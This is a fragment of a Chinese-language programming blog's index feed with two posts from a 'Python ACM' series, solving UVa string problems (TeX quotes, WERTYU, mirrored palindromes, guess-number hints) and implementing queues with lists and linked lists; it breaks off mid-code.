      </categories>
      
      
        <tags>
            
            <tag> Coding </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从零开始的Python ACM Ch.4：序列和字符串的算法</title>
      <link href="/posts/Go-for-Python-Ch4/"/>
      <url>/posts/Go-for-Python-Ch4/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="UVa272-TeX中的引号"><a href="#UVa272-TeX中的引号" class="headerlink" title="UVa272 TeX中的引号"></a>UVa272 TeX中的引号</h3><p><a href="https://vjudge.net/problem/UVA-272">TEX Quotes - UVA 272 - Virtual Judge (vjudge.net)</a></p><ul><li>在Tex中，左引号是&#96;&#96;,右引号是’ ‘。</li><li>给定一段包含双引号的段落，你的任务是把它转换成Tex的格式。</li></ul><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets@master/img/Go-for-Python-Ch4/Tex.png"></p><h4 id="个人题解"><a href="#个人题解" class="headerlink" title="个人题解"></a>个人题解</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">ArticleInput = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&quot;To be or not to be,&quot; quoth the bard, &quot;that</span></span><br><span class="line"><span class="string">is the question&quot;.</span></span><br><span class="line"><span class="string">The programming contestant replied: &quot;I must disagree.</span></span><br><span class="line"><span class="string">To `C&#x27; or not to `C&#x27;, that is The Question!&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">flag = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">ArticleOutput = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">start = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> place <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ArticleInput)):</span><br><span class="line">    <span class="keyword">if</span> ArticleInput[place] == <span class="string">&#x27;&quot;&#x27;</span> <span class="keyword">and</span> <span class="keyword">not</span> flag:</span><br><span class="line">        ArticleOutput += ArticleInput[start:place] + <span class="string">&quot;``&quot;</span></span><br><span class="line">        start = place + <span class="number">1</span></span><br><span class="line">        flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">elif</span> ArticleInput[place] == <span class="string">&#x27;&quot;&#x27;</span> <span class="keyword">and</span> flag:</span><br><span class="line">        ArticleOutput += ArticleInput[start:place] + <span class="string">&quot;&#x27;&#x27;&quot;</span></span><br><span class="line">        start = place + <span class="number">1</span></span><br><span class="line">        flag = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(ArticleOutput)</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">``To be or not to be,&#x27;&#x27; quoth the bard, ``that</span><br><span class="line">is the question&#x27;&#x27;.</span><br><span class="line">The programming contestant replied: ``I must disagree.</span><br><span class="line">To `C&#x27; or not to `C&#x27;, that is The Question!&#x27;&#x27;</span><br></pre></td></tr></table></figure><h3 id="UVa10082-WERTYU"><a href="#UVa10082-WERTYU" class="headerlink" title="UVa10082 WERTYU"></a><strong>UVa10082 WERTYU</strong></h3><p>把手放在键盘上，稍不注意就会往右错一位。这样，输入Q会变成输入W，输入J会变成输入K等。键盘如图所示。 输入一个错位后敲出来的字符串（所有字母均大写），输出打字员本来想打出的矩阵输入保证合法，即一定是错位之后的字符串。例如输入中不会出现大写字母A。多行输入 每行包括数字，空格，大写字母（除了Q，A，Z）或者是标点符号（除了“’”(L右面第2个)），标有单词的按键，如Tab，BackSp，Control等等不会出现。你需要用每个字母或者符号左面的（在如图给出的QWERTY类型的键盘）那个按键内容替换他，输入的空格不作处理，依然输出空格。</p><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets@master/img/Go-for-Python-Ch4/UVa10082.jpg"></p><h4 id="个人题解（打表真累……）"><a href="#个人题解（打表真累……）" class="headerlink" title="个人题解（打表真累……）"></a>个人题解（打表真累……）</h4><p><a href="https://www.cnblogs.com/1v7w/p/13870486.html">UVa10082 - WERTYU 题解 - 1v7w - 博客园 (cnblogs.com)</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">KeyboardInput = <span class="string">&#x27;O S, GOMR YPFSU/&#x27;</span></span><br><span class="line"></span><br><span class="line">KeyMap = &#123;</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;E&#x27;</span>: <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;T&#x27;</span>: <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;I&#x27;</span>: <span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;O&#x27;</span>: <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;[&#x27;</span>: <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;]&#x27;</span>: <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>: <span class="string">&#x27;]&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;S&#x27;</span>: <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;F&#x27;</span>: <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;G&#x27;</span>: <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;H&#x27;</span>: <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;J&#x27;</span>: <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;K&#x27;</span>: <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;L&#x27;</span>: <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;:&#x27;</span>: <span class="string">&#x27;L&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>: <span class="string">&#x27;:&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X&#x27;</span>: <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;N&#x27;</span>: <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;M&#x27;</span>: <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;,&#x27;</span>: <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;.&#x27;</span>: <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;/&#x27;</span>: <span class="string">&#x27;.&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;3&#x27;</span>: <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;5&#x27;</span>: <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;6&#x27;</span>: <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;-&#x27;</span>: <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;=&#x27;</span>: <span class="string">&#x27;-&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Output = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> KeyboardInput:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        Output += KeyMap[key]</span><br><span class="line">    <span class="keyword">except</span> KeyError <span class="keyword">as</span> e:</span><br><span class="line">        Output += <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(Output)</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I AM FINE TODAY.</span><br></pre></td></tr></table></figure><p>属于是牺牲空间换时间了~</p><h3 id="回文串和镜像串的判断"><a href="#回文串和镜像串的判断" class="headerlink" title="回文串和镜像串的判断"></a><strong>回文串和镜像串的判断</strong></h3><p>输入一个字符串，判断它是否为回文串以及镜像（左右翻转）串。输入字符串保证不含数字0。所谓回文串，就是反转以后与原串相同，如abba和madam。所谓镜像串，就是左右镜像之后和原串相同，如2S和3AIAE。注意，并不是每个字符在镜像之后都能得到一个合法字符。（空白项表示该字符镜像后不能得到一个合法字符。）</p><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets@master/img/Go-for-Python-Ch4/Mirror-and-Reverse.png"></p><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets@master/img/Go-for-Python-Ch4/Mirror-and-Reverse-Sample.png"></p><h4 id="个人题解-1"><a href="#个人题解-1" class="headerlink" title="个人题解"></a>个人题解</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">InputStrings = <span class="string">&#x27;&#x27;&#x27;NOTAPALINDROME</span></span><br><span class="line"><span class="string">ISAPALINILAPASI</span></span><br><span class="line"><span class="string">2A3MEAS</span></span><br><span class="line"><span class="string">ATOYOTA&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">MirrorMap = &#123;</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>: <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;E&#x27;</span>: <span class="string">&#x27;3&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;H&#x27;</span>: <span class="string">&#x27;H&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;I&#x27;</span>: <span class="string">&#x27;I&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;J&#x27;</span>: <span class="string">&#x27;L&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;L&#x27;</span>: <span class="string">&#x27;J&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;M&#x27;</span>: <span class="string">&#x27;M&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;O&#x27;</span>: <span class="string">&#x27;O&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;S&#x27;</span>: <span class="string">&#x27;2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;T&#x27;</span>: <span class="string">&#x27;T&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;U&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;W&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X&#x27;</span>: <span class="string">&#x27;X&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;Y&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Z&#x27;</span>: <span class="string">&#x27;5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;S&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;3&#x27;</span>: <span class="string">&#x27;E&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;5&#x27;</span>: <span class="string">&#x27;Z&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;8&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> string <span class="keyword">in</span> InputStrings.split(<span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">    Reverse = <span class="literal">True</span> <span class="keyword">if</span> string == string[::-<span class="number">1</span>] <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line">    Mirror = <span class="literal">False</span></span><br><span class="line">    MirrorString = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    Valid = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> string:</span><br><span class="line">        <span class="keyword">if</span> Valid:</span><br><span class="line">            <span class="keyword">if</span> MirrorMap.get(char, <span class="literal">False</span>):</span><br><span class="line">                MirrorString += MirrorMap[char]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                Valid = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> Valid <span class="keyword">and</span> MirrorString == string[::-<span class="number">1</span>]:</span><br><span class="line">        Mirror = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> Reverse <span class="keyword">and</span> Mirror:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;string&#125;</span> -- is a mirrored palindrome.&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> Reverse <span class="keyword">and</span> <span class="keyword">not</span> Mirror:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;string&#125;</span> -- is a regular palindrome.&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> Reverse <span class="keyword">and</span> Mirror:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;string&#125;</span> -- is a mirrored string.&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;string&#125;</span> -- is not a palindrome.&#x27;</span>)</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NOTAPALINDROME -- is not a palindrome.</span><br><span class="line">ISAPALINILAPASI -- is a regular palindrome.</span><br><span class="line">2A3MEAS -- is a mirrored string.</span><br><span class="line">ATOYOTA -- is a mirrored palindrome.</span><br></pre></td></tr></table></figure><h3 id="UVa340-猜数字游戏的提示"><a href="#UVa340-猜数字游戏的提示" class="headerlink" title="UVa340 猜数字游戏的提示"></a>UVa340 <strong>猜数字游戏的提示</strong></h3><p>这是一个猜数游戏，第1行是答案序列的长度，也是询问的序列的长度（输入0结束），第2行是答案序列，接下来n行是询问序列，直到输入全0结束，每一个询问你都得给出回答，(x,y)，x代表的是输入的序列中的数字与答案序列中的数字有几个是吻合的，y代表输入序列中的数字与答案序列中的数字有几个相同的，但是不在同一位置，也就是不吻合。现在请你编程实现这个功能。</p><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets@master/img/Go-for-Python-Ch4/Number-Game.png"></p><h4 id="个人题解-2"><a href="#个人题解-2" class="headerlink" title="个人题解"></a>个人题解</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">length = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;Length: &#x27;</span>))</span><br><span class="line">Origin = <span class="built_in">input</span>(<span class="string">&#x27;Origin Input (Split with space): &#x27;</span>).split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getOutput</span>(<span class="params">Input</span>):</span><br><span class="line">    NumCount = getNumMatch(Input)</span><br><span class="line">    PosCount = getPosMatch(Input)</span><br><span class="line">    <span class="keyword">return</span> (PosCount, NumCount)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getNumMatch</span>(<span class="params">Input</span>):</span><br><span class="line">    NumCount = <span class="number">0</span></span><br><span class="line">    InputList = Input.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    CheckedList = []</span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(InputList)):</span><br><span class="line">        <span class="keyword">if</span> InputList[pos] <span class="keyword">in</span> Origin <span class="keyword">and</span> InputList[pos] == Origin[pos]:</span><br><span class="line">            CheckedList.append(InputList[pos])</span><br><span class="line">        <span class="keyword">if</span> InputList[pos] <span class="keyword">in</span> Origin <span class="keyword">and</span> InputList[pos] != Origin[pos] <span class="keyword">and</span> <span class="keyword">not</span> InputList[pos] <span class="keyword">in</span> CheckedList:</span><br><span class="line">            <span class="built_in">print</span>(pos)</span><br><span class="line">            NumCount += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> NumCount</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getPosMatch</span>(<span class="params">Input</span>):</span><br><span class="line">    PosMatch = <span class="number">0</span></span><br><span class="line">    InputList = Input.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(InputList, Origin)</span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        <span class="keyword">if</span> InputList[pos] == Origin[pos]:</span><br><span class="line">            PosMatch += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> PosMatch</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        Input = <span class="built_in">input</span>(<span class="string">&#x27;Input: &#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(Input.split(<span class="string">&#x27; &#x27;</span>)) == length <span class="keyword">and</span> <span class="keyword">not</span> <span class="built_in">any</span>(Input.split(<span class="string">&#x27; &#x27;</span>)):   <span class="comment"># any()一旦里面有一个不是0就会返回True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Result = getOutput(Input)</span><br><span class="line">            <span class="built_in">print</span>(Result)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Coding </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从零开始的Python ACM Ch.3：队列、链表与二叉树</title>
      <link href="/posts/Go-for-Python-Ch3/"/>
      <url>/posts/Go-for-Python-Ch3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h2><p>队列，跟现实中一样，遵循先进先出的原则<code>FIFO</code>，从尾巴进去，从头部出来</p><h3 id="用列表模拟队列"><a href="#用列表模拟队列" class="headerlink" title="用列表模拟队列"></a>用列表模拟队列</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Queue</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.data = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">enquen</span>(<span class="params">self, value</span>):</span><br><span class="line">        self.data.append(value)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dequen</span>(<span class="params">self</span>):</span><br><span class="line">        value = self.data[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">del</span> self.data[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">return</span> value</span><br></pre></td></tr></table></figure><p>删除会比较慢（不如链表构建的队列），因为每次<code>del</code>都是一个完整的<code>O(n)</code>操作</p><h3 id="用链表模拟队列"><a href="#用链表模拟队列" class="headerlink" title="用链表模拟队列"></a>用链表模拟队列</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Node</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value=<span class="literal">None</span>, <span class="built_in">next</span>=<span class="literal">None</span></span>):</span><br><span class="line">        self.value = value</span><br><span class="line">        self.<span class="built_in">next</span> = <span class="built_in">next</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Queue</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.head = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">enquen</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.head:   <span class="comment"># 当头为空</span></span><br><span class="line">            self.head = Node(value) <span class="comment"># 将头设置为新节点</span></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        tail: Node = self.head</span><br><span class="line">        <span class="keyword">while</span> tail.<span class="built_in">next</span>:</span><br><span class="line">            tail = tail.<span class="built_in">next</span></span><br><span class="line">        tail.<span class="built_in">next</span> = Node(value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dequen</span>(<span class="params">self</span>):</span><br><span class="line">        value = self.head.value</span><br><span class="line">        self.head = self.head.<span class="built_in">next</span></span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">size</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.head:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span> </span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        head = self.head</span><br><span class="line">        <span class="keyword">while</span> head != <span class="literal">None</span>:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            head = head.<span class="built_in">next</span></span><br><span class="line">        <span class="keyword">return</span> count</span><br></pre></td></tr></table></figure><p><code>size</code>还可以作为属性来写，更方便</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Node</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value=<span class="literal">None</span>, <span class="built_in">next</span>=<span class="literal">None</span></span>):</span><br><span class="line">        self.value = value</span><br><span class="line">        self.<span class="built_in">next</span> = <span class="built_in">next</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Queue</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.head = <span class="literal">None</span></span><br><span class="line">        self.size = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">enquen</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.head:   <span class="comment"># 当头为空</span></span><br><span class="line">            self.head = Node(value) <span class="comment"># 将头设置为新节点</span></span><br><span class="line">            self.size += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        tail: Node = self.head</span><br><span class="line">        <span class="keyword">while</span> tail.<span class="built_in">next</span>:</span><br><span class="line">            tail = tail.<span class="built_in">next</span></span><br><span class="line">        tail.<span class="built_in">next</span> = Node(value)</span><br><span class="line">        self.size += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dequen</span>(<span class="params">self</span>):</span><br><span class="line">        value = self.head.value</span><br><span class="line">        self.head = self.head.<span class="built_in">next</span></span><br><span class="line">        self.size -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> value</span><br></pre></td></tr></table></figure><h2 id="例题：击鼓传花"><a href="#例题：击鼓传花" class="headerlink" title="例题：击鼓传花"></a>例题：击鼓传花</h2><p>一共有<code>n</code>个人玩击鼓传花小游戏，步数为<code>p</code>，问最后活下来的是谁</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">game</span>(<span class="params">persons: <span class="built_in">list</span>, step: <span 